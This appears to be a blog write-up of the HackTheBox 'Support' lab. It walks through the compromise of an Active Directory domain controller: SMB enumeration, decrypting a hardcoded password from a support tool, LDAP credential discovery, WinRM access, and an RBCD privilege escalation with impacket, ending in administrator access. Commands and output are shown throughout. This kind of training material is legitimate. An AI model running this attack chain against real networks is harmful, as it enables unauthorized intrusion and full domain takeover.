---
layout: post
title:  "Support (HackTheBox) Writeup"
date:   2026-02-09 13:00:00 +0530
categories: [HackTheBox, Active Directory]
---


**Support** is a Windows Active Directory machine where SMB enumeration reveals a custom tool with hardcoded credentials. These credentials allow LDAP enumeration, exposing excessive permissions that can be abused via Resource-Based Constrained Delegation (RBCD) to achieve full domain compromise.

**Hack The Box**:  [Support](**https://app.hackthebox.com/machines/Support**)

## Enumeration

Starting with the nmap scan.

```
nmap -p 1-10000 -sCV -O -T4 -Pn 10.129.230.181
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-08 08:52 -0500
Nmap scan report for 10.129.230.181
Host is up (0.50s latency).
Not shown: 9987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-08 13:55:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022
Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-08T13:56:41
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing en
```

The result showed that the machine is a Windows Domain Controller with most of the AD services running. The domain was identified as `support.htb`.

I started enumerating the shares using `smbclient` and found one non default share called `support-tools`. I further enumerated the
content of the found share and there were a lot of support tools which are publicly available except for the `UserInfo.exe`. So, I downloaded the .zip file on my local machine to look further into it.

```
smbclient -L \\\\10.129.230.181\\        
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.230.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available


smbclient //10.129.230.181/support-tools -U 'guest'
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

smb: \> get UserInfo.exe.zip
getting file \npp.8.4.1.portable.x64.zip of size 5439245 as npp.8.4.1.portable.x64.zip getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (82.9 KiloBytes/sec) (average 174.7 KiloBytes/sec)
```

After extracting the content of the .zip file, I analyzed `UserInfo.exe` using **dnSpy**.

Analyzing it revealed an `LdapQuery` class which is responsible for interacting with Active Directory. In its constructor, the application retrieves the decrypted password by calling `Protected.getPassword()` and uses it to authenticate to the domain via LDAP as the user `support\ldap`

Further inspection identified the `getPassword()` method inside the `UserInfo.Services.Protected` class. This method returns a hardcoded password at runtime by decoding a stored Base64 string and applying a simple XOR-based operation using a static key to recover the plaintext password.

![](/assets/image/support/Pasted%20image%2020260209130455.png)

![](/assets/image/support/Pasted%20image%2020260208230632.png)

To decrypt the password, I used a Python script which revealed the plaintext password.

```
import base64

def decrypt_password(enc_password_b64, key):
    encrypted_bytes = base64.b64decode(enc_password_b64)
    key_bytes = key.encode('utf-8')
    decrypted_bytes = bytearray()

    for i in range(len(encrypted_bytes)):
        decrypted_byte = encrypted_bytes[i] ^ key_bytes[i % len(key_bytes)] ^ 223
        decrypted_bytes.append(decrypted_byte)

    try:
        # Try decoding using cp1252 (same as Windows Encoding.Default in most cases)
        return decrypted_bytes.decode('cp1252')
    except UnicodeDecodeError:
        # Return fallback hex representation if decoding fails
        return decrypted_bytes.hex()

# Inputs
enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando"

# Decrypt
decrypted_password = decrypt_password(enc_password, key)
print("Decrypted password:", decrypted_password)

```

```
python3 decrypt.py 
Decrypted password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz

```

I verified the credentials for user `ldap` using `nxc` against the smb service and it worked.

```
xc smb 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
SMB         10.129.230.181  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.230.181  445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
```

With the newly obtained credentials, I performed LDAP enumeration to gather additional information about user accounts and user `support` stood out as they have a info attribute which contains a plaint-text data that possibly could be a password.

```
ldapsearch -H ldap://10.129.230.181 -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" "(objectClass=person)"
```

```
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==

```

I verified the credential for user `support` using `nxc` against the `winrm` service and it worked.

```
nxc winrm 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'                                                                                
WINRM       10.129.230.181  5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb) 
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.230.181  5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)

```

I used `WinRM` to get the shell on the target machine using credential for user `support`. I navigated to the user’s desktop to get the **user flag**. 

```
evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'                                      

                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> type ..\desktop\user.txt
9230899318246951f3c827**********

```

## Bloodhound

I used `bloodhound` to enumerate Active Directory relationships and permissions to identify possible paths to Domain Administrator. For this, I used **bloodhound-python**.

```
bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -d support.htb -v --zip -c All -ns 10.129.230.181

```

From the findings, user `support` is found to be a member of the `Suuport Shared Account` which has **GenericALL** privilege over `DC.SUPPORT.HTB` and can be used to compromise the domain.

![](/assets/image/support/Pasted%20image%2020260209001840.png)

![](/assets/image/support/Pasted%20image%2020260209114144.png)


## Privilege Escalation 

I added a computer account to the domain using Impacket’s `addcomputer`. This created a new machine account (`YUKI$`).

```
impacket-addcomputer -computer-name 'YUKI$' -computer-pass 'yuki@123456' -dc-ip 10.129.230.181 'support.htb/support:Ironside47pleasure40Watchful' 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account YUKI$ with password yuki@123456.

```

Next, I used **Resource-Based Constrained Delegation (RBCD)** by allowing computer account (`YUKI$`) to impersonate users on the Domain Controller.

```
impacket-rbcd -delegate-from 'YUKI$' -delegate-to 'DC$' -dc-ip 10.129.230.181 -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] YUKI$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     YUKI$        (S-1-5-21-1677581083-3380853377-188903654-6101)
```

Next I requested a service ticket for the administrator user, which could be used to authenticate as administrator.

```
impacket-getST -spn 'cifs/dc.support.htb' -impersonate 'administrator' 'support.htb/YUKI$:yuki@123456'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

Loaded the ticket into the current session by setting the `KRB5CCNAME`.

```
export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

I used impacket’s `psexec` to get the shell on the target system as administrator via `pass-the-ticket` attack. The last step was navigating to the Administrator’s desktop to retrieve the **root flag**.

```
impacket-psexec -k -no-pass support.htb/Administrator@dc.support.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file QtdcvMQl.exe
[*] Opening SVCManager on dc.support.htb.....
[*] Creating service ySlw on dc.support.htb.....
[*] Starting service ySlw.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
7f8c9ca30b437ec3e170fa**********

```